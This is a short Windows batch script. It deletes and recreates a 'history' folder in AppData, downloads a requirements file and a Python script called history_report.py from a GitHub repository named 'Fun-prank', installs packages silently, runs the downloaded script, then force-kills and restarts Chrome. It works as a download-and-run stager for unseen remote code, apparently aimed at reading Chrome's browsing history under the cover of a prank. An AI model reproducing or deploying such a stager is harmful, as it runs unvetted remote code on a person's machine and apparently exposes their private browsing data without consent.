@echo off
echo Starting process...

:: Check if the history folder exists
if exist "%APPDATA%\history" (
    echo History folder exists. Deleting the old history folder...
    rmdir /s /q "%APPDATA%\history"
)

:: Create the history folder again
mkdir "%APPDATA%\history"

:: Navigate to the folder
cd "%APPDATA%\history"

:: Check if the 'requirements.txt' exists
if not exist "requirements.txt" (
    echo Downloading 'requirements.txt'...
    powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Rma2212/Fun-prank/refs/heads/main/requirements.txt' -OutFile 'requirements.txt'"
)

:: Install necessary Python packages silently
echo Installing required libraries...
pip install --quiet --user -r requirements.txt

:: Check if the Python script exists
if not exist "history_report.py" (
    echo Downloading the Python script...
    powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Rma2212/Fun-prank/refs/heads/main/history_report.py' -OutFile 'history_report.py'"
)

:: Run the Python script
echo Running the Python script...
python "%APPDATA%\history\history_report.py"

:: Wait for 3 seconds after running the Python script
timeout /t 3 /nobreak

:: Reopen Google Chrome (force close and restart)
taskkill /f /im chrome.exe
start chrome.exe

echo Process complete!
pause
